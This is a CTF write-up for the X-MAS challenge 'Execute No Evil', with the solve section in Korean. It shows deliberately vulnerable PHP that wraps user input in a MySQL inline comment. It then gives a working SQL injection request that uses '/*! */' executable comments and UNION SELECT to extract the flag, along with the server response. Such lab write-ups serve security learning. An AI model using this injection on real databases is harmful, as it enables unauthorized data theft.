# Execute No Evil
> ## Overview
(1) New Message: "Hey dude. So we have this database system at work and I just found an SQL injection point. I quickly fixed it by commenting out all the user input in the query. Don't worry, I made the query so that it responds with boss's profile, since he is kind of the only person actively using this database system, and he always looks up his own name, lol. Anyway, guess we'll go with this til' the sysadmin comes and fixes the issue."

Huh, so hear no evil, see no evil, ... execute no evil?
```php
<?php
include ("config.php");
$conn = new mysqli ($servername, $username, $password, $dbname);

if (isset ($_GET['name'])) {
    $name = $_GET['name'];
    $name = str_replace ("*", "", $name);
    $records = mysqli_query ($conn, "SELECT * FROM users WHERE name=/*" . $name . "*/ 'Geronimo'", MYSQLI_USE_RESULT); // Don't tell boss

    if ($records === false) {
        die ("<p>Our servers have run into a query error. Please try again later.</p>");
    }

    echo '<table>';
    echo '
    <tr>
        <th>Name</th>
        <th>Description</th>
    </tr>';

    while ($row = mysqli_fetch_array ($records, MYSQLI_ASSOC)) {
        echo '<tr>
            <td>',$row["name"],'</td>
            <td>',$row["description"],'</td>
        </tr>';
    }

    echo '</table>';
}
?>
```

> ## Solve
우리가 입력하는 $name 값은 in-line comment로 주석처리가 된다.  
때문에 str_replace를 우회해서 * 를 입력할 수 있거나 다른 방법을 시도해봐야 했다.  
먼저 str_replace를 우회하기 위해서 여러가지 방법을 시도해봤지만 잘안되었다.  
mysql 주석에 대하여 찾아보다가 다음과 같은 구문을 보았다.  
```
/*! MySQL-specific code */
```
[https://dev.mysql.com/doc/refman/8.0/en/comments.html](https://dev.mysql.com/doc/refman/8.0/en/comments.html)  
해당 문서에서 설명하기를 in-line 주석안에 !를 사용함으로써 안에서 특정 구문을 실행시킬 수 있다고 나와있다.  
이를 통해 union 구문을 실행하여 information_schema를 통해 flag 테이블의 flag값을 가져올 수 있다.  
> Request
```
/?name=! 'heogi' union select 1,whatsthis,3 from flag union select 4,5,6 from users where name=
```
> Response
```html
<head>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
<form class="center">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type="text" name="name" autocomplete="off">
	<input type="submit" value="Search">
</form>
<br>
<!-- ?source=1 -->

<table>
	<tr>
		<th>Name</th>
		<th>Description</th>
	</tr><tr>
			<td>X-MAS{What?__But_1_Th0ught_Comments_dont_3x3cvt3:(}</td>
			<td>3</td>
		</tr><tr>
			<td>5</td>
			<td>6</td>
		</tr></table>
</body>
```
